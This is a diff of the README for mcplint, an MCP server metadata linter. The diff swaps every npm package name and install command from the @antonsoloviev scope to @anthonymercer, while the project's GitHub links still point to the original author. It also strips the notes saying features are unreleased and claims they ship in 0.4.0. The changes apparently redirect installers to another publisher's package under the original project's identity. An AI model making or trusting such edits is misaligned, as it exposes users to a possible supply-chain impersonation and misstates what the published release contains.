@@ -2,7 +2,7 @@
 
 Inspect MCP metadata and review the contract a server exposes.
 
-[![npm](https://img.shields.io/npm/v/@antonsoloviev/mcplint)](https://www.npmjs.com/package/@antonsoloviev/mcplint)
+[![npm](https://img.shields.io/npm/v/@anthonymercer/mcplint)](https://www.npmjs.com/package/@anthonymercer/mcplint)
 [![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
 [![Live demo](https://img.shields.io/badge/live%20demo-native%20contract%20diff-35d0ba.svg)](https://antonsoo.github.io/mcplint/filesystem-dependencies.html)
 
@@ -15,13 +15,13 @@ changes 13 tool schemas. `read_text_file` loses its declared parameters.
 and download both native snapshots. [Reconstruction, source hashes and public
 verification](studies/metadata-diff/publication/README.md) keep the result reproducible.
 
-A schema can also compile while excluding every choice it advertises. The
-source checkout finds four such contradictions in current SVGverseAI registry
+A schema can also compile while excluding every choice it advertises.
+mcplint finds four such contradictions in current SVGverseAI registry
 metadata: numeric and boolean parameters offer only strings. [View the retained
 report](https://antonsoo.github.io/mcplint/enum-choices.html) or [replay the
 evidence](studies/finite-choices/README.md). The optional fields can still be
 omitted; this is a warning about their declared choices, not a runtime or
-privacy claim. This rule is not yet in the npm release.
+privacy claim.
 
 ## Why this exists
 
@@ -42,18 +42,18 @@ estimates the collected definitions and inspects their text before they reach th
    write-up and Johann Rehberger's [Unicode Tag "ASCII smuggling"](https://embracethered.com/blog/posts/2024/hiding-and-finding-text-with-unicode-tags/)
    research. The rules flag related patterns for review; a finding does not establish malicious intent.
 4. **Contract drift.** The same compiled server can expose different parameter schemas under
-   different dependency resolutions. A score does not record what changed. The source checkout
+   different dependency resolutions. A score does not record what changed. mcplint
    captures definitions and compares their actual fields, including required parameters.
 
 Server authors need a fast linter to run in CI, before a bad tool definition ships. Anyone installing a
 third-party MCP server needs a way to see what they're actually adding to their model's context before they run
 it. mcplint is both: a CI-friendly rule engine, and a one-shot audit CLI.
 
-The source checkout marks explicitly non-complete discovery responses as audit
+mcplint marks explicitly non-complete discovery responses as audit
 gaps. A tool array beside `resultType: "input_required"` no longer produces a
 complete 100-point report and passing CI gate. Definitions remain available for
 linting; [SDK, saved-response and metadata-comparison evidence](studies/result-types/README.md)
-is retained. This correction is not yet an npm release or hosted update.
+is retained.
 
 ## What real servers look like
 
@@ -74,24 +74,22 @@ server), and a finding says where a tool or a server stands among the census ser
 
 The census also showed that the released attack rules were wrong about real servers: 0.3.3 reported 14 errors
 there, none an attack, for text like an agency code `OECD.ENV` and "no API key needed). Returns ready-to-run
-YAML". The rules in this checkout (**unreleased**) were reworked on those servers: one attack signal is now a
+YAML". The rules in 0.4.0 were reworked on those servers: one attack signal is now a
 warning and two on the same tool are an error. They report 0 errors and 2 warnings on the servers they were
 reworked on, which proves little. On 886 servers they had not seen they report 5 errors and 7 warnings (0.3.3:
 36 and 39); read by hand, none of the errors is an attack, two are false alarms. Two of the three published
 tool-poisoning examples are still errors; the third, a WhatsApp takeover, fell from an error to a warning.
 
-The source checkout also keeps name comparisons usable when a server supplies long names.
+mcplint also keeps name comparisons usable when a server supplies long names.
 Two 8,198-character names previously exhausted a 256 MiB Node heap before an audit could
 be written; the same SDK server captures now produce complete reports and retain the
 invalid-name findings. [Reproduction and unchanged registry findings](studies/name-comparisons/README.md).
-This change is unreleased.
 
 Repeated names within one server now produce `naming/collision` errors too,
 including repeats across list pages. A two-definition fixture previously passed
 with zero findings; it now fails `--fail-on error` while retaining both schemas.
 The cached registry replay contains five previously missed repeated names.
-[Reproduction and report examples](studies/duplicate-names/README.md). This is
-also an unreleased source change.
+[Reproduction and report examples](studies/duplicate-names/README.md).
 
 ### Review what changed after an update
 
@@ -132,17 +130,17 @@ identical, but 13 tool schemas change: `read_text_file` loses its declared `path
 restriction. This compares pinned historical installations, not the latest server.
 The site build now includes an [interactive real-server comparison](https://antonsoo.github.io/mcplint/filesystem-dependencies.html)
 and its original snapshots; [delivery evidence](studies/metadata-diff/publication/README.md)
-separates local builds from public hosting. The capture and diff commands remain
-**unreleased source features**; no npm release is implied by the demo.
+separates local builds from public hosting. The capture and diff commands
+are in 0.4.0.
 
 ## Quickstart
 
 ```sh
-npx @antonsoloviev/mcplint stdio -- node your-server.js
+npx @anthonymercer/mcplint stdio -- node your-server.js
 ```
 
-That runs the published package ([`@antonsoloviev/mcplint`](https://www.npmjs.com/package/@antonsoloviev/mcplint)
-on npm; the command it installs is `mcplint`). `npm install -g @antonsoloviev/mcplint` puts it on your `PATH`.
+That runs the published package ([`@anthonymercer/mcplint`](https://www.npmjs.com/package/@anthonymercer/mcplint)
+on npm; the command it installs is `mcplint`). `npm install -g @anthonymercer/mcplint` puts it on your `PATH`.
 
 To build and try it from source instead (what the commands below were actually run against):
 
@@ -154,13 +152,12 @@ node dist/cli.js stdio -- npx tsx examples/good-server/server.ts
 
 ## Features
 
-- **Large catalog audits (source checkout):** share only fixed official
+- **Large catalog audits:** share only fixed official
   meta-schema validators and estimate each tool once per audit. In fresh Node
   processes, the retained 2,530-tool gateway goes from a median 3.81s to 2.73s;
   a 314-tool long-description catalog goes from 2.54s to 1.98s. All 1,304
   retained server audits (25,799 tools) stay identical apart from generation time.
   [Inputs, five-sample timings, memory and limits](studies/audit-throughput/README.md).
-  This is not yet an npm release.
 
 - **Four targets**: `stdio` (spawn a server), `http` (Streamable HTTP, falling back to the older HTTP+SSE
   transport, with custom headers), `file` (a saved `tools/list` result or a bare tool array), `config` (every
@@ -171,7 +168,7 @@ node dist/cli.js stdio -- npx tsx examples/good-server/server.ts
   `${env:NAME}` and `${input:id}` for VS Code, `${NAME}` and `${NAME:-default}` for Claude Code; `cwd` and
   `envFile` are honored. A server marked `"disabled": true`, or one that needs a value mcplint was not given,
   is named and left out, never started with a literal `${API_KEY}`.
-  In the source checkout (unreleased), `"env": {"TOKEN": null}` removes that variable from the child,
+  `"env": {"TOKEN": null}` removes that variable from the child,
   even if it comes from the parent or `envFile`; an empty string remains an empty string.
   [Actual child-process reproduction](studies/config-env-unset/README.md).
   `envFile` also reads inline comments, quoted hashes and supported escape sequences as VS Code does;
@@ -191,32 +188,31 @@ node dist/cli.js stdio -- npx tsx examples/good-server/server.ts
 - **Collection coverage** in every report: retained pages, malformed entries, missing config inputs and failed
   servers stay visible. Incomplete audits have no score and fail either `--fail-on` threshold. See
   [scope, limits and API changes](docs/collection-coverage.md).
-- **HTTP read bounds (source checkout).** Stop oversized JSON responses and SSE
+- **HTTP read bounds.** Stop oversized JSON responses and SSE
   lines/event data before metadata decoding exhausts the audit process. Earlier
   pages remain inspectable with incomplete coverage and no score.
   [Memory-limited CLI and ordinary SDK controls](studies/http-bounds/README.md).
   Valid short SSE comments also scan with bounded separator-search work; a
   [loopback reproduction](studies/sse-scan/README.md) previously timed out during
   initialization while repeatedly rescanning the same received bytes.
-- **Connection deadlines (source checkout).** A server has 30 seconds to open its transport and
+- **Connection deadlines.** A server has 30 seconds to open its transport and
   complete initialization, including legacy HTTP fallback. Set `--connect-timeout <ms>` for slow
   startup. A timed-out config entry remains incomplete while the next server is audited.
   [Loopback reproduction, process cleanup and installed-package results](studies/connection-deadlines/README.md).
   POSIX stdio cleanup now also stops the launched process group, including servers
   behind npm and background helpers, after collection, failures and CLI interruption.
   [Live-process and heartbeat reproduction](studies/stdio-processes/README.md).
-- **Bounded connection diagnostics (source checkout).** CLI errors keep recognized
+- **Bounded connection diagnostics.** CLI errors keep recognized
   HTTP/MCP/system codes without copying response bodies or initialization error
   text into stderr. Malformed server-config and credential-argument diagnostics
   omit value excerpts. [Real transport captures and scope](studies/connection-diagnostics/README.md).
-- **Annotation types (source checkout).** String-valued behavior hints such as
+- **Annotation types.** String-valued behavior hints such as
   `"readOnlyHint": "false"` leave an audit incomplete and unscored. Valid siblings
   and usable titles remain inspectable. [Live/saved list checks against the SDK](studies/tool-annotations/README.md).
-- **Strict file decoding (source checkout).** Damaged UTF-8 or UTF-16 is rejected
+- **Strict file decoding.** Damaged UTF-8 or UTF-16 is rejected
   before it can change audited text or a configured credential. UTF-8 (with or
   without a BOM) and UTF-16 with a BOM remain supported.
   [Byte-level CLI and process-start evidence](studies/input-decoding/README.md).
-  These source changes have not been released to npm.
 - Never calls `tools/call` on anything it lints — it only ever does the MCP handshake plus `*/list`.
 
 ![Incomplete audit with retained evidence and inert hostile text from a synthetic regression fixture](docs/assets/coverage-dark-1440.png)
@@ -243,7 +239,7 @@ mcplint config .vscode/mcp.json --input api-key="$API_KEY"
 mcplint stdio --fail-on error --format sarif --output mcplint.sarif -- node server.js
 ```
 
-In the source checkout, report/snapshot destinations cannot replace the input
+Report/snapshot destinations cannot replace the input
 definitions, selected lint config, MCP client config or its resolved `envFile`
 inputs. File aliases and colliding outputs are checked before configured servers
 start. Existing reports are replaced atomically; snapshots require a new path,
